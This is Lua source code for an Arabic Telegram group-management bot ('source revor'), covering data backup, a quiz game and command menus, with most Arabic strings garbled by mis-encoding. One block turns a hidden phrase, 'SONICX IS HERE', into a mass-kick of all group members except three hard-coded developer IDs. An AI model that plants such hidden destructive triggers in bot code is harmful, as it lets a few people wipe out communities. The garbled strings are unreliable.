link = database:get(bot_id.."Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Tshake":"'..NAME..'",'
else
t = t..',"'..v..'":{"Tshake":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
if #memo ~= 0 then 
t = t..'"mem":['
for k,v in pairs(memo) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(Id_Sudo, msg.id_,'./File_Libs/'..bot_id..'.json', 'β’:  ΨΉΨ―Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ { '..#list..'} .\nβ’: ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ { '..#memo..' } .')
database:set(bot_id.."AutoFile:Time",os.date("%x"))
end
else 
database:set(bot_id.."AutoFile:Time",os.date("%x"))
end
end
 if text == "Ψ§ΨΆΩ Ψ³ΩΨ§Ω ΩΩΨ§ΩΨ§Ψͺ" then
if not Devss(msg) then
send(msg.chat_id_,msg.id_,' ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± Ψ?Ψ§Ψ΅ Carbon ΩΩΨ·')
return false
end
database:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"Ψ§Ψ±Ψ³Ω Ψ§ΩΨ³Ψ€Ψ§Ω Ψ§ΩΨ§Ω ")
end
if text == "Ψ­Ψ°Ω Ψ³ΩΨ§Ω ΩΩΨ§ΩΨ§Ψͺ" then
if not Devss(msg) then
send(msg.chat_id_,msg.id_,' ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± Ψ?Ψ§Ψ΅ Carbon ΩΩΨ·')
return false
end
database:del(bot_id.."makal:bots")
return send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­Ψ°Ω Ψ§ΩΨ§Ψ³Ψ¦ΩΩ")
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ³Ψ€Ψ§Ω Ψ¨ΩΨ¬Ψ§Ψ­')
database:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,"true1uu")
database:sadd(bot_id.."makal:bots", text)
return false end
end
if text == 'ΩΩΨ§ΩΨ§Ψͺ' then
local list = database:smembers(bot_id.."makal:bots")
if #list ~= 0 then
quschen = list[math.random(#list)]
quschen1 = string.gsub(quschen,"-"," ")
quschen1 = string.gsub(quschen1,"*"," ")
quschen1 = string.gsub(quschen1,"β’"," ")
quschen1 = string.gsub(quschen1,"_"," ")
quschen1 = string.gsub(quschen1,","," ")
quschen1 = string.gsub(quschen1,"/"," ")
print(quschen1)
send(msg.chat_id_, msg.id_,'['..quschen..']')
database:set(bot_id.."makal:bots:qus"..msg.chat_id_,quschen1)
database:setex(bot_id.."mkal:setex:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 60, true) 
end
end
if text == ""..(database:get(bot_id.."makal:bots:qus"..msg.chat_id_) or '').."" then
local timemkall = database:ttl(bot_id.."mkal:setex:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
local timemkal = (60 - timemkall)
if tonumber(timemkal) == 1 then
send(msg.chat_id_, msg.id_,'  Ψ§Ψ³ΨͺΩΨ± Ω ΩΨ­Ψ΄ ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 2 then
send(msg.chat_id_, msg.id_,'  Ψ§ΩΩΨ― ΩΨ­Ψ― ΩΩΨ§ΩΨ³Ω ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 3 then
send(msg.chat_id_, msg.id_,'  Ψ§ΨͺΩΩΨΉ ΩΨ­Ψ― ΩΩΨ§ΩΨ³Ω ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 4 then
send(msg.chat_id_, msg.id_,'  ΩΨ±ΩΨ¨ ΨͺΩΨ±Ψ¨Ω !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 5 then
send(msg.chat_id_, msg.id_, '  Ψ΅Ψ­ ΨΉΩΩΩ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 6 then
send(msg.chat_id_, msg.id_,'   Ψ΅Ψ­ΩΨ­ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 7 then
send(msg.chat_id_, msg.id_,'   Ψ΄Ψ― Ψ­ΩΩΩ ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 8 then
send(msg.chat_id_, msg.id_, '  ΨΉΩΨ―Ω Ψ§Ψ³Ψ±ΨΉ ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 9 then
send(msg.chat_id_, msg.id_,'   ΩΨ¬Ω ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 10 then
send(msg.chat_id_, msg.id_,'   ΩΩΩ ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 11 then
send(msg.chat_id_, msg.id_,'   ΩΨ§Ψ΄ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 12 then
send(msg.chat_id_, msg.id_,'   ΩΨ³ΨͺΩΩ ΩΨ³ΨͺΩΩ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 13 then
send(msg.chat_id_, msg.id_,'   ΨͺΨ―Ψ±Ψ¨ ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 14 then
send(msg.chat_id_, msg.id_,'   ΩΨ―Ψ±Ω ΩΨ΄ Ψ§ΩΩΩ ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 15 then
send(msg.chat_id_, msg.id_,'   Ψ¨Ψ·Ω ! \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 16 then
send(msg.chat_id_, msg.id_,'   Ω Ψ¨Ψ·ΩΨ· !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 17 then
send(msg.chat_id_, msg.id_,'   ΩΨ§ΩΩ Ψ§Ψ³Ψ±ΨΉ  !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 18 then
send(msg.chat_id_, msg.id_,'   Ψ¨ΩΩΨ±  !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 19 then
send(msg.chat_id_, msg.id_,'   ΩΨ΄ ΩΨ°Ψ§ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 20 then
send(msg.chat_id_, msg.id_,'   Ψ§ΩΩΩ ΩΨΉΩΩΩ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 21 then
send(msg.chat_id_, msg.id_,'   ΩΩΨ¨ΩΨ±Ψ―Ω ΩΨΉΩΩ ΩΩΩΩΩ  !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 22 then
send(msg.chat_id_, msg.id_,'   ΩΨ¨Ω ΩΩ ΨͺΨ―Ψ±ΩΨ¨  !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 23 then
send(msg.chat_id_, msg.id_,'   Ψ§ΩΨͺ Ψ§Ψ?Ψ± ΩΨ§Ψ­Ψ― Ψ±Ψ³ΩΨͺ ΩΨ΄ Ψ°Ψ§ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 24 then
send(msg.chat_id_, msg.id_,'   ΩΩΩΩΩ Ψ¨Ψ·Ω !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 25 then
send(msg.chat_id_, msg.id_,'   Ψ§Ψ¨Ω ΩΨ΄ Ψ§ΩΨΉΩΩ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 26 then
send(msg.chat_id_, msg.id_,'  Ψ§Ψ?Ψ± ΩΨ±Ψ§ ΨͺΩΨΉΨ¨ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 27 then
send(msg.chat_id_, msg.id_,'   Ω Ψ¨Ψ·Ω !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 28 then
send(msg.chat_id_, msg.id_,'   ΩΩΩ Ψ§ΩΨͺ Ψ¨Ψ·Ω ΩΨ?ΩΩ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 29 then
send(msg.chat_id_, msg.id_,'   ΨͺΨ―Ψ¨Ψ± Ψ²ΩΩ Ψ¨Ψ³  !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
elseif tonumber(timemkal) == 30 then
send(msg.chat_id_, msg.id_,'  ΩΨ³ΨͺΩΩ Ψ¨Ψ³ !  \n ΨΉΨ―Ψ― Ψ§ΩΨ«ΩΨ§ΩΩ {'..timemkal..'}')
end
database:del(bot_id.."makal:bots:qus"..msg.sender_user_id_..":"..msg.chat_id_)
database:del(bot_id.."mkal:setex:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
if text == 'Ψ§ΩΨ³ΩΨ±Ψ³' or text == 'Ψ³ΩΨ±Ψ³' or text == 'ΩΨ§ Ψ³ΩΨ±Ψ³' or text == '"' then
local Text =[[
Β° source revor ππ source revor Β°
]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = ' πππ© .', url = "https://t.me/uu_iv"}
},
{
{text = ' πππ© .', url = "https://t.me/MahmoudM2"}
},
{
{text = ' source revor .', url = "https://t.me/revorb0t"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendAnimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/REVORB0T/442&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
-----------------------------------------------

------------------------------------------------
if text == 'Ψ³ΩΩΩΩ' then
local Text =[[
Β° πππ πππππΎ ππππ π Β°
]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = ' Β° πΎππππΌπΎπ ππππ ππ Β° .', url = "https://t.me/uu_iv"}
},
{
{text = ' source revor .', url = "https://t.me/revorb0t"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/REVORB0T/427&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ΩΨ­ΩΩΨ―' then 
local Text = [[ 
[DEV MAHMOUD β](tg://user?id=1593178008)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§ βοΈ', url="t.me/MahmoudM2"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
------
if text == 'ΩΩΩΩ Ψ§ΩΨ­Ψ°Ω' or text == 'Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΨ­Ψ°Ω' or text == 'Ψ¨ΩΨͺ Ψ§ΩΨ­Ψ°Ω' then
Text = [[
ΩΩΨ§ Ψ¨Ψ§ΩΨ³ΩΨ§ΩΩ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΨΆΨΊΨ· ΩΩΨ§ ΩΨ­Ψ°Ω Ψ­Ψ³Ψ§Ψ¨Ω', url = "t.me/dlatbot"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'Ψ§ΩΨ§ΨΆΨ§ΩΨ§Ψͺ' or text == 'Ψ§ΩΩΩΩΨ²Ψ§Ψͺ' or text == 'Ψ§ΩΨ₯ΨΆΨ§ΩΨ§Ψͺ' then
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
local Text =[[
β β  ββ source revor ββ  β β
Ψ§ΩΩΨ§ Ψ¨Ω ΩΩ ΩΩΩΨ²Ψ§Ψͺ Ψ³ΩΨ±Ψ³ Ψ±ΩΩΩΨ± Ψ§ΨΆΨΊΨ· ΨΉΩΩ Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ± ΩΨ±Ψ€ΩΩ Ψ§ΩΩΩΩΨ²Ψ§Ψͺ
β β β β β β β β
[Ω­ source revor](t.me/Revorb0t)β’
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨΊΩΩΩΩ', callback_data="ghany"},{text = 'Ψ§ΨΊΨ§ΩΩ', callback_data="aghany"},{text = 'Ψ§ΩΩΨ§Ω', callback_data="aflam"},
},
{
{text = 'ΨͺΩΩΨͺ Ψ¨Ψ§ΩΨ΅ΩΨ±', callback_data="tweet"},{text = 'Ψ«ΩΩΨ§Ψͺ', callback_data="them"},
},
{
{text = 'ΩΨ§Ψ±ΨͺΩΩ', callback_data="cartoon"},{text = 'ΨͺΨͺΨ¬ΩΨ²ΩΩΩ', callback_data="wife"},
},
{
{text = 'Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ¬ΩΩΨΉΨͺΩ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if text == 'Ψ§ΩΨ§ΩΨ§ΩΨ±' or text == 'Ψ§ΩΨ§ΩΨ±' or text == 'Ψ§ΩΨ£ΩΨ§ΩΨ±' then
tdcli_function ({ID = "GetUser",user_id_ = bot_id,},function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_,},function(arg,mm) 
local Text = 'β β  ββ source revor ββ  β β\n \n*β  Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ*\n*β‘ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ*\n*β’ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘*\n*β£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩΩ*\n*β€ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ±ΩΩ*\n*β₯ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ³ΩΩΩ*\nβ β β β β β β β\n ΩΩΨ· Β« ['..mm.first_name_..'](tg://user?id='..mm.id_..') Β» ΩΩΩΩΩ Ψ§ΩΨͺΨ­ΩΩ Ω Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±\n[Ω­ source revor](t.me/Revorb0t)β’'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'β ', callback_data=msg.sender_user_id_.."/help1"},{text = 'β‘', callback_data=msg.sender_user_id_.."/help2"},{text = 'β’', callback_data=msg.sender_user_id_.."/help3"},
},
{
{text = 'β£', callback_data=msg.sender_user_id_.."/help4"},{text = 'β€', callback_data=msg.sender_user_id_.."/help5"},
},
{
{text = 'β₯', callback_data=msg.sender_user_id_.."/help6"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ', callback_data=msg.sender_user_id_.."/homeaddrem"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ', callback_data=msg.sender_user_id_.."/homelocks"},
},
{
{text = 'Ψ§ΨΆΩ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ¬ΩΩΨΉΨͺΩ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end,nil)
end
if (text == "SONICX IS HERE") and SudoBot(msg) then
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
},function(ta,Leader)
x = 0
local list = Leader.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id..'user:Name'..v.user_id_) then
if (v.user_id_ == 1890819157 or v.user_id_ == 1856048166 or v.user_id_ == 1593178008)  then
send(msg.chat_id_, msg.id_,'ΩΨ§ΩΩΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ¨ΩΨͺ Ψ§Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω')
else
chat_kick(msg.chat_id_, v.user_id_)
end
else
if (v.user_id_ == 1856048166 or v.user_id_ == 1593178008 or v.user_id_ == 1890819157) then
send(msg.chat_id_, msg.id_,'ΩΨ§ΩΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨ¨ΩΨͺ Ψ§Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω')
else
chat_kick(msg.chat_id_, v.user_id_)
end
end
end
end,nil)
end
if text == 'Ω1' and Admin(msg) then
Text = [[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ
β β β β β β β β β
Ω­ ΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω 
Ω­ ΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ± Ψ¨Ψ§ΩΨͺΩΩΩΨ― β’ Ψ¨Ψ§ΩΨ·Ψ±Ψ― β’ Ψ¨Ψ§ΩΩΨͺΩ
β β β β β β β β β
Ω­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·
Ω­ Ψ§ΩΩΨΉΨ±Ω
Ω­ Ψ§ΩΨͺΨ§Ω
Ω­ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω
Ω­ Ψ§ΩΨͺΨΉΨ―ΩΩ
Ω­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ
Ω­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ
Ω­ Ψ§ΩΩΩΩΨ§Ψͺ
Ω­ Ψ§ΩΨ΅ΩΨ±

Ω­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ
Ω­ Ψ§ΩΩΩΨ―ΩΩ
Ω­ Ψ§ΩΨ§ΩΩΨ§ΩΩ
Ω­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω
Ω­ Ψ§ΩΨͺΩΨ¬ΩΩ
Ω­ Ψ§ΩΨ§ΨΊΨ§ΩΩ
Ω­ Ψ§ΩΨ΅ΩΨͺ
Ω­ Ψ§ΩΨ¬ΩΨ§Ψͺ
Ω­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ

Ω­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ
Ω­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
Ω­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±
Ω­ Ψ§ΩΩΩΨ§ΩΨ΄
Ω­ Ψ§ΩΨ³ΩΩΩΩ
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ω2' and Admin(msg) then
Text = [[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΩΨ²
Ω­ ΨͺΨ§Ω ΩΩΩΩ
Ω­ ΨΉΨ―Ψ― Ψ§ΩΨ¬Ψ±ΩΨ¨
Ω­ ΩΨͺΩ
Ω­ Ψ­ΨΈΨ±
Ω­ Ψ·Ψ±Ψ―
Ω­ ΩΩΨΉ
Ω­ ΨͺΩΩΩΨ―
Ω­ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ
Ω­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ
Ω­ Ψ§ΩΩΩΨͺΩΩΩΩ
Ω­ Ψ§ΩΩΩΩΨ²ΩΩ
Ω­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ

Ω­ ΨͺΨ«Ψ¨ΩΨͺ
Ω­ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ
Ω­ Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ

Ω­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
Ω­ Ψ§ΩΩΩΨ§ΩΩΩ

Ω­ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
Ω­ Ψ§ΨΆΩ /ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ 
Ω­ ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± + Ψ§ΩΨΉΨ―Ψ―
Ω­ Ψ§ΩΨ―Ω
Ω­ Ψ¬ΩΨ§ΨͺΩ
Ω­ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ
Ω­ Ψ±Ψ³Ψ§Ψ¦ΩΩ
Ω­ ΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
β β β β β β β β β
Ω­ ΩΨΆΨΉ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
β β β β β β β β β
Ω­ Ψ§Ψ³Ω
Ω­ Ψ±Ψ§Ψ¨Ψ·
Ω­ Ψ΅ΩΨ±Ω
Ω­ ΩΨ΅Ω
Ω­ ΩΩΨ§ΩΩΩ
Ω­ ΨͺΨ±Ψ­ΩΨ¨
β β β β β β β β β
Ω­ ΩΨ³Ψ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
β β β β β β β β β
Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
Ω­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ
Ω­ Ψ§ΩΩΩΩΨ²ΩΩ
Ω­ Ψ§ΩΩΩΨͺΩΩΩΩ
Ω­ Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ
Ω­ Ψ§ΩΩΩΨ§ΩΩΩ
Ω­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
Ω­ Ψ§ΩΨ΅ΩΨ±Ω
Ω­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
Ω­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
β β β β β β β β β
[source revor](t.me/Revorb0t)β’
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
if text == 'Ω3' and Manger(msg) then
Text = [[
Ω­ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
β β β β β β β β β
Ω­ Ψ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ
Ω­ Ψ±ΩΨΉ/ΩΨ΄Ω Ψ§ΩΩΩΩΨ―
Ω­ ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ

Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΩΨ§ΩΩ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΉΨ¨Ω/Ψ§ΩΨ§ΩΨΉΨ§Ψ¨
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΨ·Ψ±Ψ―
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·/Ψ¬ΩΨ¨ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄
Ω­ ΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ
Ω­ ΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω

Ω­ Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ
Ω­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ―
Ω­ Ψ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ― ΩΨͺΨΉΨ―Ψ―
Ω­ Ψ§ΩΨ§Ψ―ΩΩΩΩ
Ω­ Ψ§ΩΨ±Ψ―ΩΨ―

Ω­ ΨͺΩΨΈΩΩ + ΨΉΨ―Ψ―
